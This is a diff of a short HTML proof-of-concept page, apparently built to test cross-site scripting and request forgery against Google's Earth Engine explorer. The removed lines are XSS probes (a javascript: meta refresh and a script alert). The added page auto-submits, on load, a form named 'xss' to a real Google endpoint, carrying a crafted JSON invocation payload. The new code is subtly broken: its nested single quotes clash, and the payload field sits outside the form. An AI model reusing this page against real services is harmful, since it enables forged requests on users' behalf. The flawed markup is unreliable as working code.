@@ -1,12 +1,9 @@
 <html>
 <head>
-<meta http-equiv="X-UA-Compatible" content="IE=7">
-<meta http-equiv="refresh" content="0;URL='javascript:alert(0)'" />
-<script>alert(document.documentMode)</script>
 </head>
-<body onload="document.getElementById('xss').submit()">
+<body onload='document.getElementById('xss').submit()'>
 
-<form  id="xss" action="https://explorer.earthengine.google.com/getProject" method="POST"></form>
-
+<form  id='xss' action='https://explorer.earthengine.google.com/getProject' method='POST'></form>
+<input type='text' name='json' value='{"type":"CompoundValue","scope":[["0",{"type":"Invocation","arguments":{"tableId":"ft:18aIkHMBXsztSUD9Dxbze8sjG-ThqFIuhCXp5UcCY"},"functionName":"Collection.loadTable"}],["1",{"type":"Invocation","arguments":{"collection":{"type":"ValueRef","value":"0"},"property":"Number"},"functionName":"AggregateFeatureCollection.histogram"}]],"value":{"type":"ValueRef","value":"1"}}' >
 
 </body>
